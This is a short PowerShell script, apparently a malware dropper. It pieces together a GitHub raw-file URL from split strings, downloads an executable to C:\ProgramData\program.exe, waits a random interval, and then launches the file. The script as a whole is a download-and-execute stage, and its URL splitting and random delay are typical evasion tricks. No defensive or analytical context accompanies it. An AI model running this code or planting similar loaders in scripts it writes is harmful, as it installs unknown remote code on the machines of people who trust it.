$part1 = "https://github.com/floor"
$part2 = "sofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe"
$url = $part1 + "com/" + $part2
$outputPath = "C:\ProgramData\program.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$randomDelay = Get-Random -Minimum 5 -Maximum 15
Start-Sleep -Seconds $randomDelay
Start-Process $outputPath
